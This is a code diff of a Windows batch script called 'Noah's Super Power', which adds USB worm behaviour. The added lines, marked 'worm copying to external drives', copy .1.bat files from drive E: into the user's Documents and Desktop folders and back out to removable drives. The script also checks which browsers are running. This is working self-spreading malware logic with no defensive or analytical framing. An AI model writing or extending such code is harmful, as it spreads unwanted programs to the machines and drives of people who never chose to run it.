@@ -1,5 +1,5 @@
 :::::::::::::::::::::::::::
-::NOAH'S SUPER POWER V1.3::
+::NOAH'S SUPER POWER V1.2::
 :::::::::::::::::::::::::::
 :: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com
 
@@ -31,10 +31,14 @@ tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">
 if "%ERRORLEVEL%"=="0" goto yesedge
 
 REM worm copying to external drives
-::if on usb copy to desktop
+::if on usb copy to documents
 if exist "C:\Users\%username%\Documents\*.1.bat" goto pass1
-if /i "%CD:~0,3%" EQU "E:\" goto copyfromusb
+if /i "%CD:~0,3%" EQU "E:\" goto copyfromusbtodoc
 :pass1
+::if on usb copy to desktop
+if exist "C:\Users\%username%\Desktop\*.1.bat" goto pass2
+if /i "%CD:~0,3%" EQU "E:\" goto copyfromusbtodesk
+:pass2
 
 ::if on desktop copy to usb
 if not exist "E:\" goto loop
@@ -88,9 +92,14 @@ timeout /t 0 >nul
 set /a okay=0
 goto loop
 
-:copyfromusb
+:copyfromusbtodoc
 for /r %%f in (*.1.bat) do (
 type %%~nxf >>"C:\Users\%username%\Documents\%%~nxf"
+)
+goto loop
+:copyfromusbtodesk
+for /r %%f in (*.1.bat) do (
+type %%~nxf >>"C:\Users\%username%\Desktop\%%~nxf"
 )
 goto loop
 
